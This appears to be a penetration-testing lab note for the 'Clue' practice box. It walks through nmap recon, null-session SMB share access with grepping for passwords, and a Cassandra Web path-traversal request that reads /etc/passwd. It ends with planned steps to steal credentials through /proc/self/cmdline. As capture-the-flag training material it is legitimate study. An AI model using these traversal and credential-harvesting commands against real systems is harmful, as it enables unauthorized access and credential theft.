# Clue — PG Practice

> **Note:** the box IP changes on each redeploy. Captured outputs below show different IPs from different sessions — set `IP` at the start of a session and use it:
> ```bash
> export IP=192.168.102.240
> ```

- **My IP:** 192.168.45.166
- **Target IP:** 192.168.102.240 (changes per deploy)

---

## Recon — nmap

```bash
nmap -sC -sV -p- $IP -oN scans/nmap-full.txt
```

```
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http             Apache httpd 2.4.38   # 403 Forbidden
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3000/tcp open  http             Thin httpd            # title: Cassandra Web
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux
```

### Port triage
- **22 (SSH)** — useful with creds, or if we can drop a key into an `authorized_keys`. Also handy for file transfer.
- **80 (HTTP)** — 403 Forbidden splash. Backup directory referenced but not accessible from the front end.
- **139/445 (SMB)** — check for readable shares (the "backup web directory" hint lines up with port 80).
- **3000 (HTTP / Cassandra Web)** — version **3.11.13**, served by `thin`. Visit-able in browser.
- **8021 (FreeSWITCH mod_event_socket)** — service product, likely needs the ESL password.

---

## SMB (139/445) — null session → readable backup share

```bash
smbclient -L //$IP/ -N
nxc smb $IP -u '' -p '' --shares
```

```
Share      Permissions   Remark
-----      -----------   ------
print$                   Printer Drivers
backup     READ          Backup web directory shares
IPC$                     IPC Service (Samba 4.9.5-Debian)
```

→ **`backup` is READ as a null session** — this is the "backup web directory" hinted at on port 80. Mount it so `grep`/`find` work across the whole tree (see [[SMB]]):

```bash
sudo mount -t cifs //$IP/backup /mnt -o guest      # -o guest for null session
grep -Ri password /mnt
```

→ The share is a **backup of the service config tree** (FreeSWITCH + Cassandra). Hunting for creds turns up:
- `event_socket.conf.xml` → `<param name="password" value="ClueCon"/>` — this is the FreeSWITCH **default** ESL password.
- `cassandra.yaml` → `keystore_password: cassandra` — TLS keystore pw, **not** a login.
- A lot of noise under `doc/` and `lang/` (Cassandra CQL docs with `alice`/`bob` example passwords — red herrings).

> **Backup ≠ live config.** `ClueCon` is the default — the running FreeSWITCH may use a different ESL password. Note it but don't trust it yet.

---

## Port 3000 — Cassandra Web 3.11.13

- Loads in the browser. "Execute CQL" button errors out → dead end there.
- Version **3.11.13** → research for known vulns. Cassandra-web 0.5.0 has a **directory / path traversal** issue.

---

## LFI / Path Traversal — discovered via Burp

Tested traversal in the raw request path. **Browser collapses `../` before sending** (dot-segment normalization), so it has to be done in Burp Repeater (or `curl --path-as-is`) which send the path raw. See [[LFI_RFI]].

**Burp Repeater — edit the request line:**
```
GET /../../../../../../etc/passwd HTTP/1.1
Host: 192.168.102.240:3000
```
→ **200 OK**, `Content-Type: application/octet-stream` — returns `/etc/passwd`:
```
root:x:0:0:root:/root:/bin/bash
...
```

**curl equivalent:**
```bash
curl -s --path-as-is "http://$IP:3000/../../../../etc/passwd" -o loot/passwd
```
→ `--path-as-is` stops curl collapsing the `../` — required or the payload never reaches the server.

---

## >>> CONTINUE HERE

Next steps to work:
- [ ] Carve real login users out of `loot/passwd` → `users.txt` (`grep -vE 'nologin|false' loot/passwd | cut -d: -f1`)
- [ ] Read `/proc/self/cmdline` through the LFI to steal the running process's creds
- [ ] Pull the **live** FreeSWITCH config (not the backup) to get the real ESL password

---

## Related Notes

- [[Clue-CassandraWeb-LFI-to-Root]]   ← full attack-chain writeup
- [[SMB]]
- [[LFI_RFI]]
- [[Curl]]
- [[SSH]]
